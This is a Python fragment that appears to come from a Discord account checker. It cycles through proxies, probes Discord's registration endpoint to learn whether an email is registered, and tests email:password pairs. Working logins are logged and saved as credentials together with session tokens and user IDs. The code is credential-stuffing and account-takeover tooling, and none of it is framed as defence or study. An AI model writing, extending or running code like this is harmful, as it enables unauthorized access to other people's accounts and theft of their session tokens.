    ...
    while not Checker.stopping:
        try:
            ...
            with Session() as s:
                ...
                payload = {
                    "fingerprint": "793580565130641419.LGQ5IVlIkNTEQfpHbXcQLA2ABrM",
                    "email": email,
                    "username": "".join(choices(l + d, k=6)),
                    "password": "rth21e98!fmPP",
                    "invite": None,
                    "consent": True,
                ...
                r = s.post(
                    "https://discord.com/api/v8/auth/register", json=payload
                ).text
                if (
                    "EMAIL_TYPE_INVALID_EMA" in r
                    or "token" in r
                    or "captcha-required" in r
                ):
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                ...
                if any(
                    ...
                    x in r.text
                    for x in [
                        "ACCOUNT_LOGIN_VERIFICATION_EMAIL",
                        '{"token": null, ',
                        "Please reset your password to log in",
                    ]
                ):
                    if not Checker.cui:
                        log("custom", ":".join([email, password]), "Discord")
                    save(
                        "Discord",
                        "custom",
                        Checker.time,
                ...
                if not Checker.cui:
                    log("good", ":".join([email, password]), "Discord")
                save(
                    "Discord",
                    "good",
                    Checker.time,
                    ":".join([email, password, token]) + f" | User ID: {user_id}",
                )
                Checker.good += 1
                return_proxy(proxy)
                return
